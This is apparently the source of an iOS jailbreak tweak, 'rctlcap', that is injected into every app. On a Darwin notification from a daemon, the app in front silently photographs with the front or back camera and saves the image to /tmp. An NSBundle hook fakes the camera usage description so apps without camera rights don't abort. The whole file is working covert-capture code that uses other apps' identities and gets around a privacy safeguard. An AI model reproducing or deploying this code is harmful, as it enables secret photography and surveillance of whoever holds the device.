// rctlcap — injected into every app. The camera can only be used by the FRONTMOST
// app (a valid foreground client), so we capture there: when rctld pulses a Darwin
// notification, the active app grabs a still, writes /tmp/rctl_cam.jpg, and pulses a
// "done" notification. AVFoundation is driven via the runtime (dlopen'd lazily so we
// don't load it into every app); the NSBundle hook supplies the camera usage string
// so the privacy check never aborts the host app.
#import <UIKit/UIKit.h>
#import <objc/message.h>
#import <dlfcn.h>
#import <notify.h>

static void caplog(NSString *s) {
    @try {
        NSString *line = [NSString stringWithFormat:@"[%@] %@\n", [[NSProcessInfo processInfo] processName], s];
        NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:@"/tmp/rctlcap.log"];
        if (!fh) { [line writeToFile:@"/tmp/rctlcap.log" atomically:NO encoding:NSUTF8StringEncoding error:nil]; return; }
        [fh seekToEndOfFile]; [fh writeData:[line dataUsingEncoding:NSUTF8StringEncoding]]; [fh closeFile];
    } @catch (id e) {}
}

static void rctl_capture(int position) {
    dispatch_async(dispatch_get_main_queue(), ^{
      @try {
        // SpringBoard also gets us injected and reports Active, but it can't be a
        // camera client (it just fails and races the real app for the device) — skip it.
        if ([[[NSProcessInfo processInfo] processName] isEqualToString:@"SpringBoard"]) return;
        UIApplication *app = [UIApplication sharedApplication];
        long st = app ? [app applicationState] : -1;
        if (!app || st != UIApplicationStateActive) { return; }   // only the frontmost app acts
        caplog([NSString stringWithFormat:@"FIRE pos=%d state=%ld", position, st]);
        dlopen("/System/Library/Frameworks/AVFoundation.framework/AVFoundation", RTLD_LAZY);
        Class CDev = NSClassFromString(@"AVCaptureDevice");
        Class CInput = NSClassFromString(@"AVCaptureDeviceInput");
        Class CSession = NSClassFromString(@"AVCaptureSession");
        Class CStill = NSClassFromString(@"AVCaptureStillImageOutput");
        if (!CDev || !CInput || !CSession || !CStill) { caplog(@"no AVF classes"); return; }
        long auth = ((long (*)(id, SEL, id))objc_msgSend)((id)CDev, NSSelectorFromString(@"authorizationStatusForMediaType:"), @"vide");
        caplog([NSString stringWithFormat:@"authStatus=%ld", auth]);

        id chosen = nil;
        NSArray *devs = ((id (*)(id, SEL, id))objc_msgSend)((id)CDev, NSSelectorFromString(@"devicesWithMediaType:"), @"vide");
        for (id d in devs) { long p = ((long (*)(id, SEL))objc_msgSend)(d, NSSelectorFromString(@"position")); if (p == position) { chosen = d; break; } }
        if (!chosen) chosen = ((id (*)(id, SEL, id))objc_msgSend)((id)CDev, NSSelectorFromString(@"defaultDeviceWithMediaType:"), @"vide");
        if (!chosen) { caplog(@"no device"); return; }

        NSError *err = nil;
        id input = ((id (*)(id, SEL, id, NSError **))objc_msgSend)((id)CInput, NSSelectorFromString(@"deviceInputWithDevice:error:"), chosen, &err);
        if (!input) { caplog([NSString stringWithFormat:@"no input: %@", err]); return; }
        id session = ((id (*)(id, SEL))objc_msgSend)(((id (*)(id, SEL))objc_msgSend)((id)CSession, NSSelectorFromString(@"alloc")), NSSelectorFromString(@"init"));
        ((void (*)(id, SEL, id))objc_msgSend)(session, NSSelectorFromString(@"setSessionPreset:"), @"AVCaptureSessionPresetPhoto");
        if (!((BOOL (*)(id, SEL, id))objc_msgSend)(session, NSSelectorFromString(@"canAddInput:"), input)) return;
        ((void (*)(id, SEL, id))objc_msgSend)(session, NSSelectorFromString(@"addInput:"), input);
        id out = ((id (*)(id, SEL))objc_msgSend)(((id (*)(id, SEL))objc_msgSend)((id)CStill, NSSelectorFromString(@"alloc")), NSSelectorFromString(@"init"));
        ((void (*)(id, SEL, id))objc_msgSend)(out, NSSelectorFromString(@"setOutputSettings:"), @{ @"AVVideoCodecKey": @"jpeg" });
        if (!((BOOL (*)(id, SEL, id))objc_msgSend)(session, NSSelectorFromString(@"canAddOutput:"), out)) return;
        ((void (*)(id, SEL, id))objc_msgSend)(session, NSSelectorFromString(@"addOutput:"), out);
        ((void (*)(id, SEL))objc_msgSend)(session, NSSelectorFromString(@"startRunning"));

        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
          @try {
            BOOL run = ((BOOL (*)(id, SEL))objc_msgSend)(session, NSSelectorFromString(@"isRunning"));
            id conn = ((id (*)(id, SEL, id))objc_msgSend)(out, NSSelectorFromString(@"connectionWithMediaType:"), @"vide");
            caplog([NSString stringWithFormat:@"running=%d conn=%d", run, conn != nil]);
            if (!conn) { ((void (*)(id, SEL))objc_msgSend)(session, NSSelectorFromString(@"stopRunning")); return; }
            void (^done)(void *, NSError *) = ^(void *sbuf, NSError *e) {
              @try {
                NSData *jpeg = sbuf ? ((id (*)(id, SEL, void *))objc_msgSend)((id)CStill, NSSelectorFromString(@"jpegStillImageNSDataRepresentation:"), sbuf) : nil;
                caplog([NSString stringWithFormat:@"completion jpeg=%lu err=%@", (unsigned long)jpeg.length, e]);
                if (jpeg.length) { [jpeg writeToFile:@"/tmp/rctl_cam.jpg" atomically:YES]; notify_post("com.greatlove.rctl.cam.done"); }
              } @catch (id e) {}
              ((void (*)(id, SEL))objc_msgSend)(session, NSSelectorFromString(@"stopRunning"));
            };
            @try { ((void (*)(id, SEL, id, id))objc_msgSend)(out, NSSelectorFromString(@"captureStillImageAsynchronouslyFromConnection:completionHandler:"), conn, done); }
            @catch (NSException *ex) { caplog([NSString stringWithFormat:@"capture threw %@", ex.reason]); ((void (*)(id, SEL))objc_msgSend)(session, NSSelectorFromString(@"stopRunning")); }
          } @catch (id e) {}
        });
      } @catch (id e) {}
    });
}

static void cam_cb(CFNotificationCenterRef c, void *obs, CFStringRef name, const void *obj, CFDictionaryRef info) {
    int pos = (CFStringCompare(name, CFSTR("com.greatlove.rctl.cam.front"), 0) == kCFCompareEqualTo) ? 2 : 1;
    rctl_capture(pos);
}

// Supply NSCameraUsageDescription for the host app's main bundle so the camera
// privacy check never SIGABRTs the app (apps without the key would otherwise crash).
%hook NSBundle
- (id)objectForInfoDictionaryKey:(NSString *)key {
    if ([key isEqualToString:@"NSCameraUsageDescription"] && self == [NSBundle mainBundle]) return @"rctl camera";
    return %orig;
}
%end

%ctor {
    @try {
        CFNotificationCenterRef nc = CFNotificationCenterGetDarwinNotifyCenter();
        CFNotificationCenterAddObserver(nc, NULL, cam_cb, CFSTR("com.greatlove.rctl.cam.back"),  NULL, CFNotificationSuspensionBehaviorDeliverImmediately);
        CFNotificationCenterAddObserver(nc, NULL, cam_cb, CFSTR("com.greatlove.rctl.cam.front"), NULL, CFNotificationSuspensionBehaviorDeliverImmediately);
    } @catch (id e) {}
}
